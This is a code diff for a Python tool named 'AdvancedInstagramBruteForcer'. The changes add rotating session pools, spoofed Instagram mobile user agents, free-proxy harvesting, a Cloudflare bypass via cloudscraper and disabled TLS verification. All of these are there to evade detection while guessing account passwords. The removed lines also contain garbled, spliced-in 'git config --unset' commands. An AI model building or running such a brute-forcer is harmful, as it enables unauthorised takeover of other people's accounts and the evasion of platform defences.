@@ -17,8 +17,8 @@ import requests
 import json
 from datetime import datetime
 import threading
-git config --unset commit.gpgsign
-git config --unset gpg.programgit config --unset gpg.programimport socket
+from concurrent.futures import ThreadPoolExecutor
+import socket
 import urllib3
 import itertools
 import base64
@@ -27,11 +27,20 @@ from urllib.parse import quote
 import ssl
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
-from fake_useragent import UserAgent
-import cloudscraper
-import asyncio
-import aiohttp
-import asyncssh
+try:
+    from fake_useragent import UserAgent
+except ImportError:
+    UserAgent = None
+try:
+    import cloudscraper
+except ImportError:
+    cloudscraper = None
+try:
+    import asyncio
+    import aiohttp
+    import asyncssh
+except ImportError:
+    asyncio = aiohttp = asyncssh = None
 
 
 class AdvancedInstagramBruteForcer:
@@ -48,16 +57,23 @@ class AdvancedInstagramBruteForcer:
         self.failed_count = 0
         self.checkpoint_count = 0
         
+        # Stealth features - Initialize before session creation
+        self.use_cloudflare_bypass = True
+        self.use_residential_proxies = True
+        self.rotate_sessions = True
+        
         # Advanced session management
         self.sessions = []
         self.session_pool_size = 50
         self.create_session_pool()
         
         # User agent rotation
+        self.ua = None
         try:
-            self.ua = UserAgent()
-        except:
-            self.ua = None
+            if UserAgent:
+                self.ua = UserAgent()
+        except Exception:
+            pass
             
         self.mobile_agents = [
             'Instagram 274.0.0.18.75 Android (29/10; 420dpi; 1080x2280; Xiaomi; Mi 9T; davinci; qcom; ru_RU; 436384447)',
@@ -557,6 +573,7 @@ class AdvancedInstagramBruteForcer:
 
     def load_proxies(self):
         """Load proxies from multiple sources"""
+        print("🌐 Loading proxies from multiple sources...")
         proxies = []
         proxy_sources = [
             'proxy_list.txt',
@@ -570,67 +587,99 @@ class AdvancedInstagramBruteForcer:
                 if source.endswith('.json'):
                     with open(source, 'r') as f:
                         data = json.load(f)
-                        proxies.extend(data.get('proxies', []))
+                        new_proxies = data.get('proxies', [])
+                        proxies.extend(new_proxies)
+                        print(f"   Loaded {len(new_proxies)} proxies from {source}")
                 else:
                     with open(source, 'r') as f:
-                        proxies.extend([line.strip() for line in f if line.strip()])
-            except:
+                        new_proxies = [line.strip() for line in f if line.strip()]
+                        proxies.extend(new_proxies)
+                        print(f"   Loaded {len(new_proxies)} proxies from {source}")
+            except Exception as e:
+                print(f"   Failed to load {source}: {e}")
                 continue
                 
         # Add some free proxy APIs
         try:
             free_proxies = self.fetch_free_proxies()
             proxies.extend(free_proxies)
-        except:
-            pass
+        except Exception as e:
+            print(f"⚠️  Failed to fetch free proxies: {e}")
             
-        return list(set(proxies))  # Remove duplicates
+        unique_proxies = list(set(proxies))  # Remove duplicates
+        print(f"✅ Total unique proxies loaded: {len(unique_proxies)}")
+        return unique_proxies
 
     def fetch_free_proxies(self):
         """Fetch free proxies from public APIs"""
         proxies = []
         try:
+            print("🌐 Fetching free proxies...")
             # ProxyList API
             response = requests.get('https://www.proxy-list.download/api/v1/get?type=http', timeout=10)
             if response.status_code == 200:
-                proxies.extend(response.text.strip().split('\n'))
-        except:
-            pass
+                new_proxies = response.text.strip().split('\n')
+                proxies.extend([p for p in new_proxies if p.strip()])
+                print(f"   Found {len(new_proxies)} proxies from proxy-list.download")
+        except Exception as e:
+            print(f"⚠️  Failed to fetch free proxies: {e}")
         return proxies
 
     def create_session_pool(self):
         """Create a pool of sessions for rotation"""
+        print("🔄 Creating session pool...")
         for i in range(self.session_pool_size):
-            session = self.create_advanced_session()
-            self.sessions.append(session)
+            try:
+                session = self.create_advanced_session()
+                self.sessions.append(session)
+                if i % 10 == 0:
+                    print(f"   Created {i+1}/{self.session_pool_size} sessions...")
+            except Exception as e:
+                print(f"⚠️  Failed to create session {i+1}: {e}")
+                # Create a basic session as fallback
+                session = requests.Session()
+                self.sessions.append(session)
+        
+        print(f"✅ Session pool ready: {len(self.sessions)} sessions")
 
     def create_advanced_session(self):
         """Create an advanced session with stealth features"""
-        if self.use_cloudflare_bypass:
-            session = cloudscraper.create_scraper(
-                browser={
-                    'browser': 'chrome',
-                    'platform': random.choice(['android', 'ios', 'windows']),
-                    'mobile': random.choice([True, False])
-                }
-            )
-        else:
-            session = requests.Session()
+        session = requests.Session()
+        
+        # Try to use cloudscraper if available
+        if self.use_cloudflare_bypass and cloudscraper:
+            try:
+                session = cloudscraper.create_scraper(
+                    browser={
+                        'browser': 'chrome',
+                        'platform': random.choice(['android', 'ios', 'windows']),
+                        'mobile': random.choice([True, False])
+                    }
+                )
+            except Exception as e:
+                print(f"⚠️  Cloudscraper failed, using standard session: {e}")
+                session = requests.Session()
         
         # Advanced retry strategy
-        retry_strategy = Retry(
-            total=3,
-            backoff_factor=1,
-            status_forcelist=[429, 500, 502, 503, 504],
-        )
-        
-        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
-        session.mount("http://", adapter)
-        session.mount("https://", adapter)
+        try:
+            retry_strategy = Retry(
+                total=3,
+                backoff_factor=1,
+                status_forcelist=[429, 500, 502, 503, 504],
+            )
+            
+            adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
+            session.mount("http://", adapter)
+            session.mount("https://", adapter)
+        except Exception as e:
+            print(f"⚠️  Retry strategy setup failed: {e}")
         
         # Disable SSL warnings
-        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-        session.verify = False
+        try:
+            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+            session.verify = False
+        except Exception:
+            pass
         
         return session
 
